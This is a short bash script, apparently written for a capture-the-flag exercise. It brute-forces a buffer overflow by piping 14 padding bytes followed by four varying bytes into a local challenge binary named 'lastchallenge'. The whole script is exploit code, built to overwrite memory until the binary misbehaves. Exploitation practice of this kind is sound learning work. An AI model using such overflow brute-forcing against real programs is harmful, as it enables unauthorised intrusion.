#!/bin/bash
for i in {10..99}
do
    for j in {10..99}
    do
        for k in {10..99}
        do
            for l in {10..99}
            do
                echo $i
                echo $j
                echo $k
                echo $l
                python -c "print(b'A'*14 + b'\x$i\x$j\x$k\x$l')" | ./lastchallenge 
            done
        done
    done
done
